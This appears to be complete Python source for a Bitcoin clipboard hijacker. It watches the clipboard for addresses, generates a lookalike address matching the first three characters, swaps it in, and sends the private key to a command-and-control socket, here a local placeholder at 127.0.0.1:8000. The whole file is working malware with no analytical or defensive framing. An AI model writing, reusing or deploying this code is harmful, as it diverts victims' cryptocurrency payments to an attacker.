import clipboard
import re
import time
import bitcoin
import socket

def netcat(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        print("Data sent to CnC")
    s.close()

def SendPrivKeyToCnC(priv_key, wallet_address):
    print(f"Sending {priv_key} for {wallet_address} to CnC Server")
    netcat("127.0.0.1", 8000, f"PrivKey={priv_key} WalletAddr={wallet_address}")


def genSimBTC(compare_addr):
    print("Generating similar wallet address...")
    similarity = 0
    wallet_address = "foo"
    while wallet_address[:3] != compare_addr[:3]:
        private_key = bitcoin.random_key()
        public_key = bitcoin.privtopub(private_key)
        wallet_address = bitcoin.pubtoaddr(public_key)
    else:
        SendPrivKeyToCnC(private_key, wallet_address)
        return (wallet_address, compare_addr, similarity)

def checkForBtcAddress():
    while True:
        check = clipboard.paste()
        print("Clipboard contains: " + check)
        if re.search(r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}", check):
            print("Found BTC Adress")
            btcAddress = re.search(r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}", check).group()
            print(f"BTC Adress is: {btcAddress}")
            if btcAddress[0] == "1":
                payloadAddress = genSimBTC(btcAddress)[0]
                payload = check.replace(btcAddress, payloadAddress)
                clipboard.copy(payload)
                print(f'Replaced "{check}" with "{payload}"')
                print("Sleeping for 2 minutes...")
                time.sleep(120)
            else:
                print("Only bitcoin addresses starting with 1 are supported")
        else:
            print("No btc address found")
        time.sleep(2)


checkForBtcAddress()
